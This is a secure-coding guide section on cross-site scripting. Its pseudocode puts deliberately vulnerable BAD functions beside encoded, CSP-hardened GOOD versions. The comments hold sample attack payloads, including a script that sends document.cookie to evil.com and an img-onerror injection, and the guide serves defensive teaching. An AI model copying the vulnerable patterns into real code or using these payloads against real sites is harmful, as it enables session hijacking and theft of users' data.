<!-- Source: Arcanum sec-context (https://github.com/arcanum-sec/sec-context), CC BY 4.0, Jason Haddix / Arcanum Information Security -->

## 3. Cross-Site Scripting (XSS)

**CWE References:** CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-80 (Improper Neutralization of Script-Related HTML Tags)
**Severity:** Critical | **Related:** [[XSS-Vulnerabilities]]

> **Risk:** XSS has the **highest failure rate (86%)** in AI-generated code. AI models are 2.74x more likely to produce XSS-vulnerable code than human developers. XSS enables session hijacking, account takeover, and data theft. AI frequently generates direct string concatenation into HTML without encoding.

### 3.1 Reflected XSS (Echoing User Input)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: User input directly echoed in response
// ========================================
FUNCTION handle_search(request):
    query = request.get_parameter("q")

    // Vulnerable: User input inserted directly into HTML
    html = "<h1>Search results for: " + query + "</h1>"
    html += "<p>No results found.</p>"
    RETURN html_response(html)
END FUNCTION

FUNCTION display_error(error_message):
    // Vulnerable: Error parameter reflected without encoding
    RETURN "<div class='error'>" + error_message + "</div>"
END FUNCTION

// Attack: /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
// Result: Script executes in victim's browser, stealing their session

// ========================================
// GOOD: HTML-encode all user input before rendering
// ========================================
FUNCTION handle_search(request):
    query = request.get_parameter("q")

    // Safe: HTML-encode user input
    safe_query = html_encode(query)

    html = "<h1>Search results for: " + safe_query + "</h1>"
    html += "<p>No results found.</p>"
    RETURN html_response(html)
END FUNCTION

FUNCTION display_error(error_message):
    // Safe: Encode before inserting into HTML
    RETURN "<div class='error'>" + html_encode(error_message) + "</div>"
END FUNCTION

// HTML encoding function
FUNCTION html_encode(input):
    result = input
    result = result.replace("&", "&amp;")
    result = result.replace("<", "&lt;")
    result = result.replace(">", "&gt;")
    result = result.replace('"', "&quot;")
    result = result.replace("'", "&#x27;")
    RETURN result
END FUNCTION
```

### 3.2 Stored XSS (Database to Page Without Encoding)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Stored data rendered without encoding
// ========================================
FUNCTION display_comments(post_id):
    comments = database.query("SELECT * FROM comments WHERE post_id = ?", [post_id])

    html = "<div class='comments'>"
    FOR comment IN comments:
        // Vulnerable: Stored data rendered directly
        html += "<div class='comment'>"
        html += "<strong>" + comment.author + "</strong>"
        html += "<p>" + comment.text + "</p>"
        html += "</div>"
    END FOR
    html += "</div>"
    RETURN html
END FUNCTION

FUNCTION display_user_profile(user_id):
    user = database.get_user(user_id)

    // Vulnerable: User-controlled fields rendered directly
    html = "<h1>" + user.display_name + "</h1>"
    html += "<div class='bio'>" + user.biography + "</div>"
    RETURN html
END FUNCTION

// Attack: Attacker saves comment with text: <script>stealCookies()</script>
// Result: Every user viewing the page executes attacker's script

// ========================================
// GOOD: Encode all database-sourced content
// ========================================
FUNCTION display_comments(post_id):
    comments = database.query("SELECT * FROM comments WHERE post_id = ?", [post_id])

    html = "<div class='comments'>"
    FOR comment IN comments:
        // Safe: All stored data is encoded
        html += "<div class='comment'>"
        html += "<strong>" + html_encode(comment.author) + "</strong>"
        html += "<p>" + html_encode(comment.text) + "</p>"
        html += "</div>"
    END FOR
    html += "</div>"
    RETURN html
END FUNCTION

FUNCTION display_user_profile(user_id):
    user = database.get_user(user_id)

    // Safe: Encode user-controlled fields
    html = "<h1>" + html_encode(user.display_name) + "</h1>"
    html += "<div class='bio'>" + html_encode(user.biography) + "</div>"
    RETURN html
END FUNCTION

// Better: Use templating engine with auto-escaping
FUNCTION display_comments_template(post_id):
    comments = database.query("SELECT * FROM comments WHERE post_id = ?", [post_id])

    // Templating engines like Jinja2, Handlebars auto-escape by default
    RETURN template.render("comments.html", {comments: comments})
END FUNCTION
```

### 3.3 DOM-Based XSS (innerHTML, document.write)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Dangerous DOM manipulation methods
// ========================================
FUNCTION display_welcome_message():
    // Vulnerable: URL parameter into innerHTML
    params = parse_url_parameters(window.location.search)
    username = params.get("name")

    document.getElementById("welcome").innerHTML =
        "Welcome, " + username + "!"
END FUNCTION

FUNCTION update_content(user_content):
    // Vulnerable: User content via innerHTML
    document.getElementById("content").innerHTML = user_content
END FUNCTION

FUNCTION load_dynamic_script(url):
    // Dangerous: document.write with external content
    document.write("<script src='" + url + "'></script>")
END FUNCTION

// Attack: ?name=<img src=x onerror=alert(document.cookie)>
// Result: XSS via event handler, bypasses simple <script> filters

// ========================================
// GOOD: Safe DOM manipulation methods
// ========================================
FUNCTION display_welcome_message():
    params = parse_url_parameters(window.location.search)
    username = params.get("name")

    // Safe: textContent treats input as text, not HTML
    document.getElementById("welcome").textContent =
        "Welcome, " + username + "!"
END FUNCTION

FUNCTION update_content(user_content):
    // Safe: textContent for plain text
    document.getElementById("content").textContent = user_content
END FUNCTION

// For when you need HTML structure (not user content)
FUNCTION create_element_safely(tag, text_content):
    element = document.createElement(tag)
    element.textContent = text_content  // Safe: content as text
    RETURN element
END FUNCTION

FUNCTION add_comment_safely(author, text):
    comment_div = document.createElement("div")
    comment_div.className = "comment"

    author_span = document.createElement("strong")
    author_span.textContent = author  // Safe

    text_p = document.createElement("p")
    text_p.textContent = text  // Safe

    comment_div.appendChild(author_span)
    comment_div.appendChild(text_p)

    document.getElementById("comments").appendChild(comment_div)
END FUNCTION

// If HTML is absolutely needed, use sanitization library
FUNCTION set_sanitized_html(element, untrusted_html):
    // Use a library like DOMPurify
    clean_html = DOMPurify.sanitize(untrusted_html)
    element.innerHTML = clean_html
END FUNCTION
```

### 3.4 Missing Content-Security-Policy

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: No CSP headers configured
// ========================================
FUNCTION configure_server():
    // No security headers set - browser allows any scripts
    server.start()
END FUNCTION

// Without CSP, even if XSS exists, attackers can:
// - Load scripts from any domain
// - Execute inline scripts
// - Use eval() and similar dangerous functions

// ========================================
// GOOD: Strict CSP implementation
// ========================================
FUNCTION configure_server():
    // Set comprehensive security headers
    server.set_header("Content-Security-Policy",
        "default-src 'self'; " +
        "script-src 'self'; " +
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data: https:; " +
        "font-src 'self'; " +
        "connect-src 'self'; " +
        "frame-ancestors 'none'; " +
        "base-uri 'self'; " +
        "form-action 'self'"
    )

    // Additional security headers
    server.set_header("X-Content-Type-Options", "nosniff")
    server.set_header("X-Frame-Options", "DENY")
    server.set_header("X-XSS-Protection", "1; mode=block")

    server.start()
END FUNCTION

// For applications needing inline scripts, use nonces
FUNCTION render_page_with_csp_nonce():
    // Generate cryptographically random nonce per request
    nonce = crypto.random_bytes(16).to_base64()

    // Set CSP with nonce
    response.set_header("Content-Security-Policy",
        "script-src 'self' 'nonce-" + nonce + "'"
    )

    // Include nonce in legitimate inline scripts
    html = "<html><body>"
    html += "<script nonce='" + nonce + "'>"
    html += "// This script will execute"
    html += "</script>"
    html += "</body></html>"

    // Attacker-injected scripts without nonce will be blocked
    RETURN html
END FUNCTION

// CSP report-only mode for testing
FUNCTION configure_csp_reporting():
    server.set_header("Content-Security-Policy-Report-Only",
        "default-src 'self'; report-uri /csp-report"
    )
END FUNCTION
```

### 3.5 Improper Output Encoding (Context-Specific)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Wrong encoding for context
// ========================================
FUNCTION render_javascript_variable(user_input):
    // Vulnerable: HTML encoding doesn't protect JavaScript context
    safe_for_html = html_encode(user_input)

    script = "<script>"
    script += "var userData = '" + safe_for_html + "';"  // Wrong context!
    script += "</script>"
    RETURN script
END FUNCTION

FUNCTION render_url_parameter(user_input):
    // Vulnerable: No URL encoding
    url = "https://example.com/page?data=" + user_input
    RETURN "<a href='" + url + "'>Link</a>"
END FUNCTION

FUNCTION render_css_value(user_color):
    // Vulnerable: No CSS encoding
    style = "<div style='color: " + user_color + ";'>Text</div>"
    RETURN style
END FUNCTION

// Attack on JS context: User input = "'; alert(1); //'"
// Result: var userData = ''; alert(1); //''; - Script injection

// ========================================
// GOOD: Context-specific encoding
// ========================================

// JavaScript string context
FUNCTION js_encode(input):
    result = input
    result = result.replace("\\", "\\\\")
    result = result.replace("'", "\\'")
    result = result.replace('"', '\\"')
    result = result.replace("\n", "\\n")
    result = result.replace("\r", "\\r")
    result = result.replace("<", "\\x3c")  // Prevent </script> breakout
    result = result.replace(">", "\\x3e")
    RETURN result
END FUNCTION

FUNCTION render_javascript_variable(user_input):
    // Safe: Proper JavaScript encoding
    safe_for_js = js_encode(user_input)

    script = "<script>"
    script += "var userData = '" + safe_for_js + "';"
    script += "</script>"
    RETURN script
END FUNCTION

// Better: Use JSON encoding for complex data
FUNCTION render_javascript_data(user_data):
    // Safest: JSON encoding handles all edge cases
    json_data = json_encode(user_data)

    script = "<script>"
    script += "var userData = " + json_data + ";"
    script += "</script>"
    RETURN script
END FUNCTION

// URL context
FUNCTION render_url_parameter(user_input):
    // Safe: URL encoding
    encoded_param = url_encode(user_input)
    url = "https://example.com/page?data=" + encoded_param

    // Also HTML-encode the entire URL for the href attribute
    RETURN "<a href='" + html_encode(url) + "'>Link</a>"
END FUNCTION

// CSS context
FUNCTION css_encode(input):
    // Only allow safe CSS values
    allowed_pattern = "^[a-zA-Z0-9#]+$"
    IF NOT regex.match(allowed_pattern, input):
        RETURN "inherit"  // Safe default
    END IF
    RETURN input
END FUNCTION

FUNCTION render_css_value(user_color):
    // Safe: Validate and encode CSS value
    safe_color = css_encode(user_color)
    style = "<div style='color: " + safe_color + ";'>Text</div>"
    RETURN style
END FUNCTION

// HTML attribute context
FUNCTION render_attribute(attr_name, user_value):
    // HTML-encode and quote attribute value
    safe_value = html_encode(user_value)
    RETURN attr_name + '="' + safe_value + '"'
END FUNCTION
```

---
